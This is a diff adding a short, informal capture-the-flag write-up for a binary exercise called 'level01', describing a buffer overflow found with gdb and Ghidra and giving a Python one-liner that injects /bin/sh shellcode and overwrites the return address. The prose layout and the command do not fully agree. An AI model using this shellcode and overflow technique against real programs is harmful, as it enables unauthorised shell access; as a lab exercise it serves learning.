@@ -1,3 +1,12 @@
+Level01
+
+We have a binary called level01
+lets debug it using gdb and decompile it using ghidra
+We cant find a system call with shell or .pass so we gonna need to inject a shell code
+We have a buffer overflow of the buffer is initialized with 16 but in fgets we can out 100bytes
+First we need to put as a user name "dat_wil" + 249 bytes to exced the user_name global variable and the first gets dat gets 0x100 bytes 256 bytes  so we can put it in a pyaload after that we gonna move to password prompt where the buffer overflow exists so  at 79 bytes it change in return address so lets put a code shell wherever we want we can put it in username or password then call it so the  pwaylaod will be somthing like this :
+
+dat_will + shellcode 25bytes+ NOP * 256-32 +  NOP * 79 + shellcode address
+
 (python -c "print 'dat_wil'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'a'*303 + '\x47\xa0\x04\x08'";cat) | ./level01
 
-256+80
